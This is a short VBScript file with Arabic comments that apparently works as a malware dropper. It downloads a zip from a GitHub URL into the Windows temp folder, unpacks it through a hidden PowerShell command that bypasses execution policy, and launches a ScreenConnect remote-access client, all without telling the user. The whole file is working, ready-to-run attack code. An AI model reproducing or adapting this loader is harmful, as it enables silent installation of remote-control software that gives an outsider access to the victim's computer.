Dim oHTTP, oStream, oShell, oFSO
Dim sUrl, sTempDir, sZipPath, sExtractPath, sExePath

sUrl = "https://github.com/parisa9193/supreme-giggle/raw/refs/heads/main/fanta.zip"
Dim sExeName
sExeName = "ScreenConnect.Client.exe"  ' ← اسم الـ EXE

' مجلد Temp
Set oShell = CreateObject("WScript.Shell")
sTempDir = oShell.ExpandEnvironmentStrings("%TEMP%") & "\"
sZipPath = sTempDir & "support.zip"
sExtractPath = sTempDir & "support\"
sExePath = sExtractPath & sExeName

' تنزيل الـ ZIP
Set oHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
oHTTP.setOption 2, 13056
oHTTP.Open "GET", sUrl, False
oHTTP.Send

If oHTTP.Status = 200 Then
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Open
    oStream.Type = 1
    oStream.Write oHTTP.ResponseBody
    oStream.SaveToFile sZipPath, 2
    oStream.Close
Else
    MsgBox "فشل التنزيل! HTTP Status: " & oHTTP.Status
    WScript.Quit
End If

' إنشاء مجلد support لو مش موجود
Set oFSO = CreateObject("Scripting.FileSystemObject")
If Not oFSO.FolderExists(sExtractPath) Then
    oFSO.CreateFolder(sExtractPath)
End If

' فك الضغط
Dim sPSCmd
sPSCmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ""Expand-Archive -Path '" & sZipPath & "' -DestinationPath '" & sExtractPath & "' -Force"""
oShell.Run sPSCmd, 0, True

' تشغيل الـ EXE بـ Shell.Application
If oFSO.FileExists(sExePath) Then
    Set oShellApp = CreateObject("Shell.Application")
    oShellApp.ShellExecute sExePath, "", sExtractPath, "open", 1
Else
    MsgBox "الملف مش موجود: " & sExePath
End If

Set oHTTP = Nothing
Set oStream = Nothing
Set oShell = Nothing
Set oFSO = Nothing
Set oShellApp = Nothing